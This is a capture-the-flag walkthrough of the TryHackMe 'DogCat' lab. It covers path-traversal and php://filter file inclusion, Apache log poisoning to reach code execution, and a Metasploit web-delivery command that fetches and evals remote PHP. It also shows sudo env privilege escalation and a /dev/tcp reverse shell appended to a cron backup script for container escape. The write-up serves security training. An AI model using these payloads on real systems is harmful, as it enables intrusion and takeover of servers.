@@ -1,0 +1,157 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
+            <h1 class="post-title entry-title">DogCat TryHackMe Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/dogcat-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-03-31T15:29:14+00:00">March 31, 2021</time><time class="updated" datetime="2025-06-10T20:06:36+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “DogCat “. It’s available at TryHackMe for penetration testing practice. This lab is of medium difficultly if we have the right basic knowledge to break the labs and are attentive to all the details we find during the reconnaissance. The credit for making this lab goes to <span style="color: #0000ff;"><strong>jammy</strong></span>. Let’s get started and learn how to break it down successfully.</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Medium</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Bypassing PHP Filter using Wrapper</span></li>
+<li><span style="color: #000000;">Reading Back-End PHP Code</span></li>
+<li><span style="color: #000000;">Bypassing Extension Filter</span></li>
+<li><span style="color: #000000;">Detecting Local File Inclusion</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation </strong></span>
+<ul>
+<li><span style="color: #000000;">Exploiting Local File Inclusion</span></li>
+<li><span style="color: #000000;">Reading Apache Access Logs</span></li>
+<li><span style="color: #000000;">Poisoning Apache Logs</span></li>
+<li><span style="color: #000000;">Upgrading LFI to RCE</span></li>
+<li><span style="color: #000000;">Getting Meterpreter on the Target Machine</span></li>
+<li><span style="color: #000000;">Reading Flag #1</span></li>
+<li><span style="color: #000000;">Enumeration for Flags</span></li>
+<li><span style="color: #000000;">Reading Flag #2</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
+<li><span style="color: #000000;">Exploiting Sudo Permissions on env</span></li>
+<li><span style="color: #000000;">Getting Root Shell on Docker Instance</span></li>
+<li><span style="color: #000000;">Reading Flag #3</span></li>
+<li><span style="color: #000000;">Enumerating Writable Script</span></li>
+<li><span style="color: #000000;">Getting Reverse Shell using Script</span></li>
+<li><span style="color: #000000;">Reading Flag #4</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
+<p><span style="color: #000000;">To read and understand what the machine is, we will be starting with reading the Lab Description:</span></p>
+<p><span style="color: #000000;"><em>“I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.”</em></span></p>
+<p><span style="color: #000000;">After Booting up the machine from the TryHackMe: DogCat Page, we will be provided with a Target IP Address.</span></p>
+<p><span style="color: #000000;"><strong>IP Address: 10.10.69.30</strong></span></p>
+<p><span style="color: #000000;">This room has 4 flags that we need to find to complete the Machine.</span></p>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">We will start with a nmap scan with -sC for Default Scripts and -sV for Scanning Versions.</span></p>
+<pre class="lang:default decode:true">nmap -sC -sV 10.10.69.30</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CET9ehXZzUc/YGSOOzXp8QI/AAAAAAAAvLE/DtZg-HhBYzQge-DhmSwVCAQyDSnxT4QVwCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Scan gives us 2 services to enumerate. It gave us the SSH service on port 22 but unfortunately, we don’t have a set of credentials to access the machine via SSH. Next, we have the HTTP Service on port 80, which we will begin our enumeration with.</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">As we have the HTTP Service Running, it is a good thing to check out the webpage that is hosted using a Web Browser. We are posed with a question. What we would like to see. Being a Dog Person, we chose Dog. It gave us such sweet pictures of Dogs that it almost made me miss the URL changes and the view parameter with dog value.</span></p>
+<pre class="lang:default decode:true">http://10.10.69.30/?view=dog</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kg_c11kKxt8/YGSOVdo43tI/AAAAAAAAvLI/_7fxB8uErA0w3rqUPhLdmodEotcIqqfWgCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">On mere instinct, it felt like this parameter might be injectable. Tried a bunch of different payloads. Then finally got to LFI. When we try to browse the etc/passwd file. It gives us an error that only dogs and cats are allowed as a value in the view parameter.</span></p>
+<pre class="lang:default decode:true">http://10.10.69.30/?view=../../../../../etc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S9jtL9fdUuY/YGSOkuKzHxI/AAAAAAAAvLQ/x-qCOlrOq148A0URaHPzUyMWAh63rw9WQCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">This seemed like there is some restriction. To bypass this restriction, we tried to provide a php filter wrapper. It can be found in the <a style="color: #000000;" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">PayloadsAllTheThings GitHub</a>.  Take the Filter and reconfigure it to run on our target machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZzhieYxpIQI/YGSOrBE5hwI/AAAAAAAAvLY/YF8bL78ZcnwGoJktgD_vGgzTPrc6T0r3wCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">When we tried to access the dog page through the wrapper, it returns a Base64 encoded string. Which when decoded returns the php code for that particular file.</span></p>
+<pre class="lang:default decode:true">&lt;img src="dogs/&lt;?php echo rand(1, 10); ?&gt;.jpg" /&gt;</pre>
+<p><span style="color: #000000;">That means that there are 10 pics of dogs on the server and the image fetched is at random.</span></p>
+<pre class="lang:default decode:true">http://10.10.69.30/?view=php://filter/convert.base64-encode/resource=dog</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OrcY6l-Cg70/YGSOvTwYUiI/AAAAAAAAvLc/VCunv8yyazAaX1_0IDUhMGQcXZJTMh5VwCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Now that we can read the contents of dog.php, we can use the same technique to read the index.php or the main page. We are doing this to figure-read the code and understand how the index.php is working. Again, we are provided with a Base64 encoded string. It was getting quite big for normal display. Hence, switched to Source Code View.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-T7WYQ8vmW6c/YGSO1GUF8XI/AAAAAAAAvLg/Twk-rCZtmjQDaY2EXj6VYb4mVWOLQGFvQCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Decoding to Clear Text, we can see the php code of the index.php page. Upon close inspection, we can see that the function adds a .php extension at the end of the URL so if we provide it with the ‘dog’  keyword it will convert it to dog.php and when we were giving it /etc/password it was converting it into /etc/passwd.php, Hence we need to escape this function to read files of our choice.</span></p>
+<pre class="lang:default decode:true">echo "###Base64 Encoded Text##" | base64 -d      
+$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4jHvDQHHspA/YGSO5aGaWsI/AAAAAAAAvLk/KBWKL0JRDNMQJzBWSu1i9jM7SUmto-VhACLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">To escape the extension, we will add a parameter as shown in the image below. Now when we try to read the /etc/passwd file, it is directly accessible. We have successfully exploited the Local File Inclusion.</span></p>
+<pre class="lang:default decode:true">http://10.10.69.30/?view=dog/../../../../../../../etc/passwd&amp;ext=</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9y4aq4Eu3iw/YGSPBp9E6wI/AAAAAAAAvLw/a9tA7sjj6GUK9w8N67NQheNu1hgG-vC4ACLcBGAsYHQ/s16000/10.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">We have the Local File Inclusion Vulnerability and from the nmap scan, we know that we are working with an Apache Server. Let’s try to convert this LFI Vulnerability into a Remote Code Execution if we can poison its logs. We have written an intensive Walkthrough of Apache Log Poisoning Through LFI. Here, we will breeze through it. If you want to learn more about it. Refer to the Link Below.</span></p>
+<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/">Apache Log Poisoning Through LFI</a></strong></span></p>
+<p><span style="color: #000000;">First, we will try to read the access.log file using LFI. The path for access.log is /var/log/apache2/access.log. We will replace our /etc/passwd with this location to read the log.</span></p>
+<pre class="lang:default decode:true">http://10.10.69.30/?view=dog/../../../../../../../var/log/apache2/access.log&amp;ext=</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GFA6ENdp4gc/YGSPH_tL1CI/AAAAAAAAvL4/MUW_hwiBDewQdrSg7BLWtSl_l3n3j3EqwCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Here, we can see that the log is accessible. Now it’s time to poison it. For this, we will be needing Burp Suite. We will capture the request using Burp Suite. Then we will manipulate the User-Agent. We can see that Default User-Agent in the image below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pAe0xgdY-vM/YGSPNExi4hI/AAAAAAAAvMA/7TMX1dNMIsEUUcIBGftsWX7rHeF8LjrJQCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">We change the User-Agent to introduce a php code that can call on system variables to run system commands. We forward the request to the server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y-j9Z4yV_fY/YGSPRD1a8VI/AAAAAAAAvMI/pzSOeaNS62M3fRqFzt_BLjbSI51PZ0VRQCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">Now we will declare the c variable with system commands to check if it worked. We will run the whoami command. As we can observe that the response to our command was visible inside the logs. The command we gave the server was run using www-data user.</span></p>
+<pre class="lang:default decode:true">http://10.10.69.30/?view=dog/../../../../../../../var/log/apache2/access.log&amp;ext=&amp;c=whoami</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ef0sYZ4O_YU/YGSPVRDN1uI/AAAAAAAAvMM/N_TFywW6L_0OfXIs5vXeFLM5RFNvmvWlQCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Now that we know that we can execute commands i.e., we have upgraded our Local File Inclusion Vulnerability to Remote Command Execution Vulnerability.  Now we can use it to get a reverse shell on the target machine. For this, we will craft a php based payload using Metasploit Web Delivery Exploit. It requires basic details such as local IP Address (Make sure to give the IP Address from VPN), local port, srvport, etc.,</span></p>
+<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
+set target 1
+set lhost 10.17.0.111
+set srvport 8081
+set payload php/meterpreter/reverse_tcp
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bT7qVJ7nqME/YGSQQkPnMlI/AAAAAAAAvMg/QhdLhouNC8AvITxvex0EJRf1g23U6E8sgCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">The Metasploit has crafted the payload as per our requirement. Now we have to copy the payload and replace the whoami command from the previous step with this payload. Please see the command depicted below.</span></p>
+<pre class="lang:default decode:true">http://10.10.69.30/?view=dog/../../../../../../../var/log/apache2/access.log&amp;ext=&amp;c=php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.17.0.111:6666/BKroYb0O0eN', false, stream_context_create(['ssl'=&gt;['verify_peer'=&gt;false,'verify_peer_name'=&gt;false]])));"</pre>
+<p><span style="color: #000000;">This would result in a reverse shell generated from the target machine to our local machine in the form of a meterpreter shell as shown in the image below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mX13EWqEyl0/YGSQWq2bTTI/AAAAAAAAvMk/fHwmrJmW0jwc484leMxaGbe8G-EHK_FNgCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">After getting to the meterpreter, we convert to the bash using the shell command. We find that to use the shell effectively we need to convert it into a TTY shell. So, we try python one-liner but the machine doesn’t have the python installed. Then we use the basic shell TTY command. After that, we run the whoami command to find that we have the shell as the www-data user. We list all the files in the current directory to find a flag.php file. Upon reading this file, we get our First Flag.</span></p>
+<pre class="lang:default decode:true">shell
+/bin/sh -i
+export TERM=xterm
+whoami 
+ls
+cat flag.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q6HjucObK3c/YGSQdJqRz-I/AAAAAAAAvMo/TNTMGKL9JxEqi6tjc8iWO-nk23m14m4NgCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">We move to the previous directory and listed its contents to find our Flag 2.</span></p>
+<pre class="lang:default decode:true">cd ..
+cat flag2_QMW7JvaY2LvK.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4c15crN2ZAo/YGSQgt3eUQI/AAAAAAAAvMw/XCaG8-iXwXMtzwctKl84LMF8PbsMFJtXQCLcBGAsYHQ/s16000/18.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">We have 2 Flags and now there is nothing more to enumerate at this user level. This means now we will have to elevate our privileges to the root level. To do this we start our enumeration by reading the sudo permissions for the current user. This returned the env binary. That means the current user can run env binary as root user without any password for root.</span></p>
+<pre class="lang:default decode:true">sudo -l
+(root) NOPASSWD: /usr/bin/env</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZosZvHVkwpQ/YGSQk0RvrTI/AAAAAAAAvM0/1ZA8o3UrdvkMqf98iaFMFVOcys88QvQgQCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">Env is a part of GTFOBin, we know that because we solved a machine that had a similar privilege escalation method. Searching for env on <a style="color: #000000;" href="https://gtfobins.github.io/gtfobins/env/">GTFOBin</a> we find that all we need to do is execute the env command as sudo with /bin/sh as its parameter.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-unqOKx8bUn4/YGSQoxRdnMI/AAAAAAAAvM4/dNAKbASsS64ZO_cJc-PA008EIAjt2ng5gCLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">Upon doing so, we get a root shell in no time. We try to look for the flag and find Flag 3 on the machine.</span></p>
+<pre class="lang:default decode:true">sudo env /bin/sh
+whoami
+cat flag3.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KCPCBi6bDXY/YGSQs1MgDBI/AAAAAAAAvNA/kyYPUza--AMokoK-yQvXK7lPDJdYkHoaACLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">If we remember the Machine Description from the Starting, we know that this is a docker instance running on the machine. The final flag must be accessible after getting out of this instance. We go to the root directory and list its contents. We can now confirm that this is indeed a docker instance. We start enumerating the usual locations and we stumbled upon a backups directory at the /opt location. The backups directory contained a compressed file and a shell script.  Upon reading the shell script we can determine that it makes a backup on the running webpages into a compressed file. This script may be running periodically using a Cron Job.</span></p>
+<pre class="lang:default decode:true">cd /
+ls -la
+cd /opt
+ls
+cd backups
+ls
+cat backup.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-n7OjvKyNivg/YGSQwpPvb2I/AAAAAAAAvNI/InWwVHhIWsIV2veIBAjsNHhoZbB504d4ACLcBGAsYHQ/s16000/22.png"/></span></p>
+<p><span style="color: #000000;">We use the echo command to insert a shell invocation command pointing towards our local machine into the backup shell script. We can see that our shell invocation command is appended in the shell script in the image given below.</span></p>
+<pre class="lang:default decode:true">echo "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.17.0.111/1234 0&gt;&amp;1'" &gt;&gt; backup.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gYXuVoI1PM8/YGSQ2tFfwKI/AAAAAAAAvNM/50LeY2Kdgqk7xtNoUdgaY9G9HBy7nS5_wCLcBGAsYHQ/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">Now we start a listener at the port mentioned inside the shell invocation command so that it can receive the reverse shell generated. We see that the session we got is of root on the machine. We list the contents to find the Fourth and Final Flag on the Machine.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234
+ls
+cat flag4.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nZqL-xu4qlo/YGSQ6h5R39I/AAAAAAAAvNQ/U7XpiaCtoB0bZ-2VKkPtw_S97cMt0drZgCLcBGAsYHQ/s16000/24.png"/></span></p>
+<p><span style="color: #000000;">This machine was quite interesting and We had quite fun while solving it.</span></p>
+<p><span style="color: #000000;">Things that we learned, A quick recap.</span></p>
+<p><span style="color: #000000;">Enumerating Parameters, Bypass PHP Filter using Wrapper, Reading the Back-End Code, Exploiting Local File Inclusion, Upgrading Local File Inclusion to Remote Code Execution, Getting Meterpreter, Elevating Privilege using Sudo permissions on env, Escaping the Docker Container using Writable Script.</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
